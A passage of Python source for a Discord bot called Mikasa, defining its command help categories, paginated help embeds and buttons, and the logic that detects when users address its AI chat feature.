            (",setlevelchannel [#channel] / ,levelsetup #channel", "Set Mikasa level-up announcement channel (Admin/Owner)"),
            (",xpinfo", "How leveling works"),
            (",givexp @user <amt>", "Owner: give XP (aliases ,addxp, ,addexp, ,addexperience)"),
            (",removexp @user <amt>", "Owner: remove XP"),
            (",resetxp @user", "Owner: reset XP"),
        ],
    },
    "moderation": {
        "title": "🛡️ Moderation",
        "desc": "Server management tools (Staff / Admin+)",
        "cmds": [
            (",kick @user [reason]", "Kick a member"),
            (",ban @user [reason]", "Ban a member"),
            (",unban <user_id>", "Unban by ID"),
            (",mute @user [duration] [reason]", "Timeout (5m, 1h, 1d)"),
            (",unmute @user", "Remove timeout"),
            (",warn @user [reason]", "Warn a member"),
            (",warnings [@user]", "View warnings"),
            (",purge [amount]", "Delete recent messages"),
            (",lock / ,unlock", "Lock or unlock channel"),
            (",slowmode / ,slowdown <seconds>", "Set channel slowmode"),
            (",role @user @role", "Toggle a role on a member"),
            (",autorole add/remove/list/clear @role", "Roles given automatically on join"),
            (",createrole <name> [color]", "Create a role"),
            (",editcolor <role> <#hex|name>", "Change a role color"),
            (",editname <role> <new name>", "Rename a role"),
            (",deleterole @role", "Delete a role"),
            (",move @role above/below @other", "Move role in hierarchy"),
            (",createchannel <name> [text|voice] [category]", "Create a channel"),
            (",editchannel [channel] name: category:", "Rename or move into category"),
            (",deletechannel [channel]", "Delete a channel"),
            (",createcategory <name>", "Create a category"),
            (",setnick @user [name]", "Set or clear nickname"),
        ],
    },
    "security": {
        "title": "🔒 Security Anti-Nuke",
        "desc": "Industry-leading anti-nuke protection",
        "cmds": [
            (",antinuke on/off/status", "Toggle anti-nuke"),
            (",whitelist @user [cats]", "Whitelist user for categories"),
            (",whitelist role @Role [cats]", "Role-based whitelist"),
            (",unwhitelist @user [cats]", "Remove whitelist"),
            (",antibot on/off/status", "Kick unknown bots on join"),
            (",antinuke lockdown / unlock", "Emergency lockdown"),
            (",antinuke setchannel [#ch]", "Alert channel"),
            (",antinuke snapshot", "Force snapshot"),
            (",securityhelp", "Security command guide"),
            (",securitycheck", "Check settings and required permissions"),
            (",setsecuritylog #channel", "Set security-alert destination"),
            (",securitytest", "Send a test security alert"),
            (",raidwatch on/off/status", "Configure join-raid monitoring"),
            (",raidwatch threshold <count>", "Set raid-watch threshold"),
            (",auditrecent [limit]", "Review recent audit-log events"),
        ],
    },
    "setup": {
        "title": "⚙️ Server Setup",
        "desc": "Configure server features — welcome, confessions",
        "cmds": [
            (",setwelcome [#channel]", "Set welcome channel"),
            (",ticketpanel", "Post ticket panel"),
            (",ticketlog [#ch]", "Ticket log channel"),
            (",ticketrole @role", "Support role for tickets"),
        ],
    },
    "logging": {
        "title": "📋 Logging",
        "desc": "Comprehensive event logger — joins, leaves, bans, edits, deletes",
        "cmds": [
            (",setlog / ,setlogs [#channel]", "Set log channel"),
            (",removelog", "Disable logging"),
            (",logstatus / ,logs", "Logging status"),
        ],
    },
    "giveaways": {
        "title": "🎁 Giveaways",
        "desc": "GiveawayBot-style giveaways — reactions, live count",
        "cmds": [
            (",giveaway <time> [winners] <prize>", "Start a giveaway"),
            (",gend <message_id>", "End giveaway early"),
            (",greroll <message_id>", "Reroll winners"),
            (",gedit <message_id> prize|winners|duration <value>", "Edit an active giveaway"),
        ],
    },
    "invites": {
        "title": "✉️ Invites",
        "desc": "Falcon-style invite tracking, leaderboard & fake-invite detection",
        "cmds": [
            (",invites / ,myinvites", "Your invite stats (real / fake / coins)"),
            (",invitelb", "Invite leaderboard"),
            (",addinvites @user <n>", "Add invites (Admin)"),
            (",removeinvites @user <n>", "Remove invites (Admin)"),
            (",resetinvites [@user]", "Delete server invites / reset one member"),
        ],
    },
    "fun": {
        "title": "🎉 Fun",
        "desc": "Friendly entertainment, prompts and casual games",
        "cmds": [
            (",meme", "Random meme"),
            (",joke", "Random joke"),
            (",magic8ball <question>", "Ask the magic 8-ball"),
            (",choose option1 | option2", "Choose between options"),
            (",compliment [@user]", "Friendly compliment"),
            (",roast [@user]", "Lighthearted roast"),
            (",riddle", "Get a riddle"),
            (",truth", "Get a truth prompt; passing is always okay"),
            (",dare", "Get a harmless optional dare"),
            (",truthordare [truth|dare]", "Choose or randomize truth/dare"),
        ],
    },
    "games": {
        "title": "🎮 Games & Fun",
        "desc": "All free fun games and mini-games; no premium role required",
        "cmds": [
            (",magic8ball <question>", "Ask the magic 8-ball"),
            (",choose option1 | option2", "Choose between options"),
            (",compliment [@user]", "Friendly compliment"),
            (",roast [@user]", "Lighthearted roast"),
            (",riddle", "Get a riddle"),
            (",truth", "Get a truth prompt; passing is always okay"),
            (",dare", "Get a harmless optional dare"),
            (",truthordare [truth|dare]", "Choose or randomize truth/dare"),
            (",rps <rock|paper|scissors>", "Rock Paper Scissors"),
            (",trivia", "Answer a trivia question"),
            (",tictactoe @user", "Play Tic-Tac-Toe"),
            (",hangman", "Word guessing game"),
            (",fasttype", "Typing speed challenge"),
            (",wordchain", "Host an organized Word Chain lobby"),
            (",dice [sides]", "Roll a die"),
            (",coinflip", "Flip a coin"),
            (",meme", "Random meme"),
            (",joke", "Random joke"),
        ],
    },
    "minigames": {
        "title": "🕹️ Mini-Games",
        "desc": "Free games for everyone; no premium role required",
        "cmds": [
            (",rps <rock|paper|scissors>", "Rock Paper Scissors"),
            (",trivia", "Answer a trivia question"),
            (",tictactoe @user", "Play Tic-Tac-Toe"),
            (",hangman", "Word guessing game"),
            (",fasttype", "Typing speed challenge"),
            (",wordchain", "Host an organized Word Chain lobby"),
            (",dice [sides]", "Roll a die"),
            (",roll [sides]", "Roll a die"),
            (",coinflip", "Flip a coin"),
        ],
    },
    "gambling": {
        "title": "🎰 Virtual Casino & Economy",
        "desc": "Virtual in-bot currency only; no real-money wagering or cash-out",
        "cmds": [
            (",balance [@user]", "Check wallet and bank"),
            (",shop", "Browse this server's currency shop"),
            (",buy <item>", "Buy an item using wallet currency"),
            (",inventory [@user]", "View purchased shop items"),
            (",daily", "Claim daily virtual coins"),
            (",bet <amount|all|half>", "Virtual coin 50/50 bet"),
            (",give @user <amount>", "Transfer virtual coins"),
            (",work / ,beg / ,crime", "Earn virtual coins"),
            (",slots [bet]", "Slot machine"),
            (",blackjack [bet]", "Play blackjack"),
            (",roulette <bet> <red|black|green|even|odd|0-36>", "Roulette"),
            (",luckyspin", "Spin for a random virtual reward"),
            (",scratch [bet]", "Scratch-card game"),
            (",roll [sides]", "Roll a die (no wager)"),
            (",currency", "View custom currency settings"),
            (",setcurrency <name> <symbol>", "Owner only: set currency display"),
            (",additem <name> <price> [description]", "Owner only: add a shop item"),
            (",removeitem <name>", "Owner only: remove a shop item"),
            (",mintcurrency @user <amount>", "Owner only: create virtual balance"),
            (",removecurrency @user <amount>", "Owner only: remove virtual balance"),
            (",addcoins @user <amount>", "Owner-restricted economy adjustment"),
            (",resetcoins @user", "Reset one member's balance (permission checked)"),
            (",resetservercoins", "Owner: reset server economy balances"),
        ],
    },
    "autorespond": {
        "title": "💬 Auto Respond",
        "desc": "Auto-reply when a trigger word is detected",
        "cmds": [
            (",autorespond list", "List triggers"),
            (",autorespond add <trigger> | <reply>", "Add auto-response"),
            (",autorespond remove <trigger>", "Remove a trigger"),
            (",autorespond clear", "Clear all triggers"),
        ],
    },
    "tickets": {
        "title": "🎫 Tickets",
        "desc": "Tickety-style private support tickets — dropdown + form",
        "cmds": [
            (",ticketpanel [#ch]", "Post ticket panel (dropdown + modal)"),
            (",ticket", "Open a ticket via type picker"),
            (",ticketlog [#ch]", "Ticket log channel"),
            (",ticketrole @role", "Support role that sees all tickets"),
            (",ticketoption list/add/remove/reset", "Manage ticket types"),
            (",close / ,closeticket", "Close current ticket"),
            (",adduser @user / ,removeuser @user", "Manage ticket members"),
            (",tickets", "List open tickets (staff)"),
        ],
    },
    "admin": {
        "title": "🧰 Server Admin",
        "desc": "Routine server administration and configuration. Owner-only controls are listed separately.",
        "cmds": [
            (",admin [server_id]", "DM setup custom admin role (name + color)"),
        ],
    },
    "owner_only": {
        "title": "👑 Primary Owner Only",
        "desc": "Sensitive bot-owner controls. Co-owner management is reserved to the primary owner.",
        "cmds": [
            (",ownerpanel", "Open the owner control panel"),
            (",co-owner add @user", "Primary owner only: grant co-owner access (full access except nuke/destroy/raid)"),
            (",co-owner remove @user", "Primary owner only: revoke co-owner access"),
            (",co-owner list", "List co-owners (owner or co-owner)"),
            (",emergencylockdown confirm", "Primary owner only: temporary message lockdown"),
            (",emergencyunlock", "Primary owner only: restore saved message settings"),
            (",premiumgrant @user", "Grant bot premium access"),
            (",premiumrevoke @user", "Revoke bot premium access"),
            (",ownerannounce #channel <message>", "Send an announcement without mass pings"),
            (",setbotactivity playing|watching|listening <text>", "Change the bot activity"),
            (",sync", "Resync application commands"),
            (",configcheck", "Check common bot configuration"),
            (",backupcreate / /backup load", "Owner-level server snapshot and restore"),
            (",myservers / ,servers", "List servers where the bot is installed"),
            (",botname <name>", "Change bot name and AI call-name"),
            (",mintcurrency @user <amount>", "Owner-only virtual currency minting"),
            (",removecurrency @user <amount>", "Owner-only virtual currency adjustment"),
            (",resetservercoins", "Reset the server's virtual economy"),
        ],
    },
    "ai": {
        "title": "🤖 AI Chat Assistant",
        "desc": "Natural chatbot — general answers and bot command help. Mention the bot or reply to continue. Needs an API key for full chat.",
        "cmds": [
            ("@Mikasa <question>", "Mention the bot and chat"),
            ("Reply to Mikasa", "Continue the conversation"),
            (",ask / ,ai / ,chat <question>", "Ask anything"),
            (",chatgpt / ,grok / ,claude / ,deepseek <q>", "Aliases of ,ask"),
            (",aistatus", "Show configured AI providers"),
            (",aiclean", "Clear AI memory in this channel"),
            (",help", "Open the command menu"),
        ],
    },
}


# Extra help entries for the newer security tools and mini-games.
# Existing category commands are preserved; these are appended only when absent.
def _append_help_items(category: str, items: list[tuple[str, str]]) -> None:
    try:
        current = HELP_CATEGORIES.setdefault(category, {"title": category.title(), "desc": "More commands", "cmds": []})
        cmds = current.setdefault("cmds", [])
        existing = {str(row[0]).split()[0].lower() for row in cmds if isinstance(row, (tuple, list)) and row}
        for command, description in items:
            if command.split()[0].lower() not in existing:
                cmds.append((command, description))
                existing.add(command.split()[0].lower())
    except Exception as exc:
        print(f"[help categories] {category}: {exc}")

_append_help_items("security", [
    (",securityhelp", "List security commands"),
    (",securitycheck", "Check security configuration and bot permissions"),
    (",setsecuritylog #channel", "Choose security alert channel (Manage Server)"),
    (",securitytest", "Send a test alert (Manage Server)"),
    (",raidwatch on|off|status", "Configure join-burst alerts"),
    (",raidwatch threshold 8", "Set join-alert threshold (5–25)"),
    (",auditrecent", "Show recent audit log entries (View Audit Log)"),
])
_append_help_items("fun", [
    (",rps rock|paper|scissors", "Play Rock Paper Scissors"),
    (",trivia", "Answer a trivia question; correct answers may award virtual coins"),
    (",tictactoe @user", "Play Tic-Tac-Toe with another member"),
    (",hangman", "Start a word guessing game"),
    (",wordchain", "Open a join/leave lobby for turn-based Word Chain"),
    (",stopwc", "Stop the word-chain game"),
    (",fasttype", "Typing speed challenge; may award virtual coins"),
    (",wouldyourather", "Get a Would You Rather question"),
    (",magic8ball <question>", "Ask the Magic 8 Ball"),
    (",choose option A | option B", "Choose randomly from options separated by |"),
    (",dice [sides]", "Roll a free die (2–1000 sides)"),
    (",compliment [@user]", "Send a friendly compliment"),
    (",roast [@user]", "Send a light, playful roast"),
    (",riddle", "Get a riddle; answer is spoiler-hidden"),
    (",luckyspin", "Free-for-fun random result; no wager"),
    (",truth", "Get a light, optional truth prompt"),
    (",dare", "Get a harmless, optional dare"),
    (",truthordare [truth|dare|random]", "Play Truth or Dare; prompts are optional and safe"),
])
_append_help_items("minigames", [
    (",rps rock|paper|scissors", "Rock Paper Scissors"),
    (",trivia", "Trivia quiz"), (",tictactoe @user", "Tic-Tac-Toe vs another member"),
    (",hangman", "Word guessing game"), (",wordchain", "Join-lobby, turn-based Word Chain"),
    (",numberguess", "Channel number hunt"), (",scramble", "Word scramble race"), (",quickpoll <question>", "Interactive poll"),
    (",fasttype", "Typing speed challenge"),
    (",truth", "Truth prompt"), (",dare", "Harmless dare prompt"),
    (",truthordare [truth|dare|random]", "Truth or Dare mini-game"),
])
HELP_CATEGORIES["minigames"]["title"] = "🕹️ Mini-Games"
HELP_CATEGORIES["minigames"]["desc"] = "Quick interactive games. Games are free to play; virtual coin games are listed under Gambling."

_append_help_items("gambling", [
    (",balance [@user]", "Check virtual coin balance"),
    (",daily", "Claim daily virtual coins"),
    (",bet <amount|all|half>", "Use virtual in-bot coins only; no real money"),
    (",slots <bet>", "Slot mini-game using virtual coins only"),
    (",blackjack <bet>", "Blackjack mini-game using virtual coins only"),
    (",coinflip <bet> heads|tails", "Coin-flip mini-game using virtual coins only"),
    (",roll <bet>", "Dice betting mini-game using virtual coins only"),
    (",scratch <bet>", "Scratch-card mini-game using virtual coins only"),
    (",work / ,beg / ,crime", "Existing virtual-coin earning commands"),
    (",give @user <amount>", "Transfer virtual coins"),
    (",addcoins @user <amount>", "Admin: adjust virtual coins"),
    (",resetcoins @user", "Admin: reset one virtual balance"),
    (",resetservercoins", "Owner: reset server virtual balances"),
])
# Improve descriptions for commands already present in the old help list.
for _cat_key, _command, _description in [
    ("fun", ",coinflip", "Coin-flip mini-game using virtual coins: ,coinflip <bet> heads|tails"),
    ("gambling", ",coinflip", "Coin-flip mini-game using virtual coins: ,coinflip <bet> heads|tails"),
]:
    for _idx, _row in enumerate(HELP_CATEGORIES.get(_cat_key, {}).get("cmds", [])):
        if isinstance(_row, (tuple, list)) and _row and str(_row[0]).split()[0].lower() == _command:
            HELP_CATEGORIES[_cat_key]["cmds"][_idx] = (_row[0], _description)
            break



def _help_is_owner(user_id: int) -> bool:
    try:
        return has_owner_access(int(user_id))
    except Exception:
        return False


def _help_visible_rows(key: str, user_id: int = 0):
    """Filter owner-only entries from help; command-level permission checks remain authoritative."""
    rows = list((HELP_CATEGORIES.get(key) or {}).get("cmds") or [])
    if _help_is_owner(user_id):
        return rows
    if key in {"owner_only", "allcommands"}:
        return []
    blocked = ("owner only", "primary owner only", "bot owner only", "owner/co-owner", "owner-exclusive", "owner: reset")
    out = []
    for row in rows:
        try:
            command, description = str(row[0]), str(row[1])
        except Exception:
            continue
        if any(term in description.lower() for term in blocked):
            continue
        if command.split()[0].lower() in {",ownerpanel", ",ownerhelp", ",ownertools", ",coowneradd", ",coownerremove", ",coowners", ",premiumgrant", ",premiumrevoke", ",ownerannounce", ",setbotactivity", ",emergencylockdown", ",emergencyunlock", ",setcurrency", ",mintcurrency", ",removecurrency", ",resetservercoins"}:
            continue
        out.append(row)
    return out


def _help_category_keys(user_id: int = 0):
    keys = list(HELP_CATEGORIES.keys())
    if not _help_is_owner(user_id):
        keys = [k for k in keys if k not in {"owner_only", "allcommands"} and _help_visible_rows(k, user_id)]
    return keys


def build_help_home(user_id: int = 0, guild=None, nav_page: int = 0) -> discord.Embed:
    """Premium dark-style command interface home (card layout)."""
    try:
        keys = _help_category_keys(user_id)
        dark = 0x1A1528
        display = "there"
        try:
            if guild is not None and getattr(guild, "get_member", None):
                m = guild.get_member(int(user_id)) if user_id else None
                if m is not None:
                    display = m.display_name
        except Exception:
            pass

        desc = (
            "**COMMAND INTERFACE**  ·  `PREMIUM`\n\n"
            "**Welcome, {name}!**\n\n"
            "Explore everything Mikasa can do for your server.\n"
            "Select a category below to view its commands."
        ).replace("\\n", chr(10)).format(name=display)
        # fallback if replace path wrong:
        if "\\n" in desc or "\n" == desc:
            pass
        desc = (
            f"**COMMAND INTERFACE**  ·  `PREMIUM`\n\n"
            f"**Welcome, {display}!**\n\n"
            f"Explore everything Mikasa can do for your server.\n"
            f"Select a category below to view its commands."
        )
        # Force real newlines:
        desc = desc.replace(chr(92) + "n", chr(10))

        e = discord.Embed(title="MIKASA", description=desc, color=dark)
        try:
            if getattr(bot, "user", None) and bot.user and bot.user.display_avatar:
                e.set_thumbnail(url=bot.user.display_avatar.url)
        except Exception:
            pass

        nav_page = max(0, min(int(nav_page or 0), max(0, (len(keys) - 1) // 4)))
        page_keys = keys[nav_page * 4: nav_page * 4 + 4]
        icons = {
            "moderation": "🛡️", "security": "🔒", "setup": "🔧", "configuration": "🔧",
            "fun": "🎮", "minigames": "🎮", "games": "🎮", "leveling": "📈",
            "gambling": "🎰", "economy": "💰", "general": "📋", "home": "🏠",
            "logging": "📋", "giveaways": "🎁", "invites": "✉️", "ai": "🤖",
            "tickets": "🎫", "owner_only": "👑",
        }
        subtitles = {
            "moderation": "Manage your members",
            "security": "Protect your server",
            "setup": "Customize your server",
            "configuration": "Customize your server",
            "fun": "Enjoy interactive commands",
            "minigames": "Enjoy interactive commands",
            "leveling": "Track your progress",
            "gambling": "Play virtual coin games",
            "general": "Everyday utility commands",
            "logging": "Server event logs",
            "giveaways": "Host prize giveaways",
            "invites": "Track invites",
            "ai": "Chat & command help",
            "home": "Server info & basics",
        }
        for k in page_keys:
            cat = HELP_CATEGORIES.get(k) or {}
            title = str(cat.get("title") or k)
            short = title
            while short and not (short[0].isalnum() or short[0] in "&"):
                short = short[1:]
            short = short.strip() or title
            icon = icons.get(k, "✨")
            sub = subtitles.get(k) or str(cat.get("desc") or "View commands")[:42]
            e.add_field(name=f"{icon}  {short}", value=f"*{sub}*", inline=True)
        if len(page_keys) % 2 == 1:
            e.add_field(name="​", value="​", inline=True)

        total_pages = max(1, (len(keys) + 3) // 4)
        foot = (
            f"Select a category to view its commands.\n"
            f"`{PREFIX}help <topic>` · page **{nav_page + 1}/{total_pages}**"
        ).replace(chr(92) + "n", chr(10))
        e.add_field(name="​", value=foot, inline=False)
        e.set_footer(text="MIKASA  •  YOUR SERVER, YOUR RULES")
        return e
    except Exception as ex:
        print(f"[build_help_home] {ex}")
        return discord.Embed(title="MIKASA", description="Use the buttons to browse commands.", color=0x1A1528)


def build_help_category(key: str, page: int = 0, user_id: int = 0) -> discord.Embed:
    try:
        keys = _help_category_keys(user_id)
        if key not in keys:
            key = keys[0] if keys else "home"
        cat = HELP_CATEGORIES.get(key) or {"title": key, "desc": "", "cmds": []}
        cmds = _help_visible_rows(key, user_id)
        per_page = 8
        total_pages = max(1, (len(cmds) + per_page - 1) // per_page)
        page = max(0, min(int(page or 0), total_pages - 1))
        chunk = cmds[page * per_page:(page + 1) * per_page]
        cat_idx = (keys.index(key) + 1) if key in keys else 0
        e = discord.Embed(
            title=f"{str(cat.get('title') or key)[:200]}",
            description=(
                f"{str(cat.get('desc') or '')[:500]}\n\n"
                f"**Page {page + 1}/{total_pages}** · `{PREFIX}help` to go home"
            ).replace(chr(92)+'n', chr(10)),
            color=0x1A1528,
        )
        for item in chunk:
            try:
                cmd, desc = item[0], item[1]
            except Exception:
                continue
            e.add_field(name=str(cmd)[:256], value=str(desc)[:1024] or "—", inline=False)
        e.set_footer(text=f"MIKASA  •  YOUR SERVER, YOUR RULES  •  {len(cmds)} commands")
        return e
    except Exception as ex:
        print(f"[build_help_category] {ex}")
        return discord.Embed(title="Help", description=f"Could not load category: `{ex}`", color=0xED4245)


class HelpView(discord.ui.View):
    """Simple Prev / Home / Next help — no select menu (max stability)."""

    def __init__(self, user_id: int = 0, guild=None, key: str = None, page: int = 0, nav_page: int = 0):
        super().__init__(timeout=180)
        self.user_id = int(user_id or 0)
        keys = _help_category_keys(self.user_id)
        if key in HELP_CATEGORIES:
            self.key = key
        else:
            self.key = keys[0] if keys else "home"
        cmds = _help_visible_rows(self.key, self.user_id)
        self.per_page = 8
        self.total_pages = max(1, (len(cmds) + self.per_page - 1) // self.per_page)
        self.page = max(0, min(int(page or 0), self.total_pages - 1))
        self.nav_page = max(0, min(int(nav_page or 0), max(0, (len(keys) - 1) // 5)))
        # Give the numbered category buttons meaningful labels, not just 1–5.
        visible = keys[self.nav_page * 5:self.nav_page * 5 + 5]
        for child in self.children:
            label = getattr(child, "label", None)
            if label in {"1", "2", "3", "4", "5"}:
                slot = int(label) - 1
                if slot < len(visible):
                    cat = HELP_CATEGORIES.get(visible[slot], {})
                    title = re.sub(r"[^A-Za-z0-9 &-]", "", str(cat.get("title") or visible[slot])).strip()
                    child.label = f"{slot + 1} {title}"[:80] or str(slot + 1)
                else:
                    child.disabled = True

    async def _guard(self, interaction: discord.Interaction) -> bool:
        try:
            if self.user_id and interaction.user and interaction.user.id != self.user_id:
                await interaction.response.send_message("Not your help menu.", ephemeral=True)
                return False
            return True
        except Exception:
            return False

    @discord.ui.button(label="Prev", style=discord.ButtonStyle.secondary, row=0)
    async def prev_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not await self._guard(interaction):
                return
            if self.page > 0:
                self.page -= 1
            else:
                keys = _help_category_keys(self.user_id)
                if not keys:
                    return
                idx = keys.index(self.key) if self.key in keys else 0
                idx = (idx - 1) % len(keys)
                self.key = keys[idx]
                cmds = _help_visible_rows(self.key, self.user_id)
                self.total_pages = max(1, (len(cmds) + self.per_page - 1) // self.per_page)
                self.page = self.total_pages - 1
            view = HelpView(self.user_id, key=self.key, page=self.page, nav_page=self.nav_page)
            await interaction.response.edit_message(embed=build_help_category(self.key, self.page, self.user_id), view=view)
        except Exception as ex:
            print(f"[HelpView.prev] {ex}")
            try:
                if not interaction.response.is_done():
                    await interaction.response.send_message(f"Error: `{ex}`", ephemeral=True)
            except Exception:
                pass

    @discord.ui.button(label="Home", style=discord.ButtonStyle.primary, row=0)
    async def home_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not await self._guard(interaction):
                return
            keys = _help_category_keys(self.user_id)
            self.key = keys[0] if keys else "home"
            self.page = 0
            view = HelpView(self.user_id, key=self.key, page=0, nav_page=self.nav_page)
            await interaction.response.edit_message(embed=build_help_home(self.user_id, nav_page=self.nav_page), view=view)
        except Exception as ex:
            print(f"[HelpView.home] {ex}")
            try:
                if not interaction.response.is_done():
                    await interaction.response.send_message(f"Error: `{ex}`", ephemeral=True)
            except Exception:
                pass

    @discord.ui.button(label="Next", style=discord.ButtonStyle.secondary, row=0)
    async def next_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not await self._guard(interaction):
                return
            if self.page < self.total_pages - 1:
                self.page += 1
            else:
                keys = _help_category_keys(self.user_id)
                if not keys:
                    return
                idx = keys.index(self.key) if self.key in keys else 0
                idx = (idx + 1) % len(keys)
                self.key = keys[idx]
                self.page = 0
                cmds = _help_visible_rows(self.key, self.user_id)
                self.total_pages = max(1, (len(cmds) + self.per_page - 1) // self.per_page)
            view = HelpView(self.user_id, key=self.key, page=self.page, nav_page=self.nav_page)
            await interaction.response.edit_message(embed=build_help_category(self.key, self.page, self.user_id), view=view)
        except Exception as ex:
            print(f"[HelpView.next] {ex}")
            try:
                if not interaction.response.is_done():
                    await interaction.response.send_message(f"Error: `{ex}`", ephemeral=True)
            except Exception:
                pass


    async def _jump_category(self, interaction: discord.Interaction, offset: int):
        if not await self._guard(interaction):
            return
        keys = _help_category_keys(self.user_id)
        idx = self.nav_page * 5 + offset
        if idx >= len(keys):
            return await interaction.response.send_message("There isn't a category in that slot on this menu page.", ephemeral=True)
        self.key = keys[idx]
        self.page = 0
        view = HelpView(self.user_id, key=self.key, page=0, nav_page=self.nav_page)
        await interaction.response.edit_message(embed=build_help_category(self.key, 0, self.user_id), view=view)

    @discord.ui.button(label="1", style=discord.ButtonStyle.secondary, row=1)
    async def cat_one(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._jump_category(interaction, 0)

    @discord.ui.button(label="2", style=discord.ButtonStyle.secondary, row=1)
    async def cat_two(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._jump_category(interaction, 1)

    @discord.ui.button(label="3", style=discord.ButtonStyle.secondary, row=1)
    async def cat_three(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._jump_category(interaction, 2)

    @discord.ui.button(label="4", style=discord.ButtonStyle.secondary, row=1)
    async def cat_four(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._jump_category(interaction, 3)

    @discord.ui.button(label="5", style=discord.ButtonStyle.secondary, row=1)
    async def cat_five(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._jump_category(interaction, 4)

    @discord.ui.button(label="Categories ◀", style=discord.ButtonStyle.secondary, row=2)
    async def cat_page_prev(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._guard(interaction):
            return
        keys = _help_category_keys(self.user_id)
        max_nav = max(0, (len(keys) - 1) // 5)
        self.nav_page = (self.nav_page - 1) % (max_nav + 1)
        view = HelpView(self.user_id, key=self.key, page=self.page, nav_page=self.nav_page)
        e = build_help_home(self.user_id, nav_page=self.nav_page)
        e.description = (e.description or "") + f"\n\n**Categories:** {(self.nav_page * 4) + 1}–{min(len(keys), self.nav_page * 4 + 4)} of {len(keys)}."
        await interaction.response.edit_message(embed=e, view=view)

    @discord.ui.button(label="Categories ▶", style=discord.ButtonStyle.secondary, row=2)
    async def cat_page_next(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._guard(interaction):
            return
        keys = _help_category_keys(self.user_id)
        max_nav = max(0, (len(keys) - 1) // 5)
        self.nav_page = (self.nav_page + 1) % (max_nav + 1)
        view = HelpView(self.user_id, key=self.key, page=self.page, nav_page=self.nav_page)
        e = build_help_home(self.user_id, nav_page=self.nav_page)
        e.description = (e.description or "") + f"\n\n**Categories:** {(self.nav_page * 4) + 1}–{min(len(keys), self.nav_page * 4 + 4)} of {len(keys)}."
        await interaction.response.edit_message(embed=e, view=view)


def _ai_is_addressed(message: discord.Message):
    """Return (True, query) if message is directed at the bot (mention, name, or reply)."""
    if not message.content:
        return False, ""
    content = message.content.strip()
    low = content.lower()
    triggers = []
    if BOT_NAME:
        triggers.append(BOT_NAME.lower())
        triggers.append(BOT_NAME.lower().replace(" ", ""))
    triggers.extend(["coolbot", "cool bot", "mikasa"])
    for a in BOT_ALIASES:
        if a:
            triggers.append(str(a).lower())

    # Reply to the bot → continue conversation (Nevil-style chat threads)
    try:
        ref = getattr(message, "reference", None)
        if ref is not None and not content.startswith(PREFIX):
            resolved = getattr(ref, "resolved", None)
            me = message.guild.me if message.guild else getattr(bot, "user", None)
            ref_author = getattr(resolved, "author", None) if resolved is not None else None
            if ref_author is not None and me is not None and getattr(ref_author, "id", None) == getattr(me, "id", None):
                return True, content
            # If Discord did not embed the parent message, only continue when parent author is the bot
            if resolved is None and me is not None and getattr(ref, "message_id", None):
                # Cached channel history fallback
                try:
                    parent = bot.get_message(ref.message_id) if hasattr(bot, "get_message") else None
                    if parent is None and getattr(message.channel, "get_partial_message", None):
                        # cannot safely fetch here (sync context) — skip to avoid false triggers
                        parent = None
                    if parent is not None and getattr(parent.author, "id", None) == me.id:
                        return True, content
                except Exception:
                    pass
    except Exception:
        pass

    # Direct mention
    if message.guild and message.guild.me and message.guild.me in message.mentions:
        q = content
        for m in message.mentions:
            q = q.replace(f"<@{m.id}>", " ").replace(f"<@!{m.id}>", " ")
        return True, q.strip()
    # starts with name
    for t in triggers:
        if not t:
            continue
        if low.startswith(t + " ") or low.startswith(t + ",") or low == t:
            return True, content[len(t):].lstrip(" ,:").strip()
        if low.startswith(t.replace(" ", "") + " "):
            return True, content[len(t.replace(" ", "")):].lstrip(" ,:").strip()
    # guild nick
    try:
        if message.guild and message.guild.me:
            nick = (message.guild.me.nick or "").lower().strip()
            if nick and (low.startswith(nick + " ") or low == nick):
                return True, content[len(nick):].lstrip(" ,:").strip()
    except Exception:
        pass
    return False, ""


def _ai_score_query(query: str):
    """Score commands against a natural language query. Returns list of (score, name, usage, desc)."""
    q = (query or "").lower().strip()
    if not q:
        return []
    tokens = set(re.findall(r"[a-z0-9]+", q))
    # command catalog for matching
    catalog = []
    for cat in HELP_CATEGORIES.values():
        for usage, desc in cat["cmds"]:
            name = usage.split()[0].lstrip(",/")
            catalog.append((name, usage, desc))
    # common aliases
    extras = [
        ("kick", ",kick @user", "Kick a member"),
        ("ban", ",ban @user", "Ban a member"),
        ("mute", ",mute @user 5m", "Timeout a member"),
        ("role", ",role @user @role", "Add or remove a role"),
        ("whitelist", ",whitelist @user [cats]", "Anti-nuke whitelist"),
        ("dm", ",dm @user [message]", "DM a user"),
        ("help", ",help", "Show help menu"),
        ("purge", ",purge 20", "Delete messages"),
        ("nick", ",setnick @user name", "Change nickname"),
    ]
    for name, usage, desc in extras:
        catalog.append((name, usage, desc))

    intent = {
        "kick": ["kick", "remove", "boot"],
        "ban": ["ban", "banned", "banish"],
        "mute": ["mute", "timeout", "silence"],
        "unmute": ["unmute", "untimeout"],
        "warn": ["warn", "warning"],
        "role": ["role", "roles", "give role", "add role", "remove role"],
        "purge": ["purge", "clear", "delete messages", "clean"],
        "whitelist": ["whitelist", "trust", "allow bot"],
        "dm": ["dm", "direct message", "message user"],
        "nick": ["nick", "nickname", "rename"],
        "help": ["help", "commands", "how"],
    }

    scored = []
    for name, usage, desc in catalog:
        score = 0
        if name in tokens or name in q:
            score += 50
        for word in re.findall(r"[a-z0-9]+", usage.lower() + " " + desc.lower()):
            if word in tokens and len(word) > 2:
                score += 3
        for intent_name, keys in intent.items():
            if intent_name == name or name in intent_name:
                for k in keys:
                    if k in q:
                        score += 25
        if score > 0:
            scored.append((score, name, usage, desc))
    scored.sort(key=lambda x: -x[0])
    # dedupe by name
    seen = set()
    out = []
    for item in scored:
        if item[1] in seen:
            continue
        seen.add(item[1])
        out.append(item)
    return out[:5]


async def _ai_respond(message: discord.Message, query: str):
    """Plain-text AI style reply — command help or general chat. Never embeds, never double-send."""
    query = (query or "").strip()
    channel = message.channel
    author = message.author
    name = getattr(author, "display_name", None) or getattr(author, "name", "friend")

    async def _say(text: str):
        """Single plain-text reply (prefer reply-to when possible)."""
        text = (text or "").strip()
        if not text:
            return
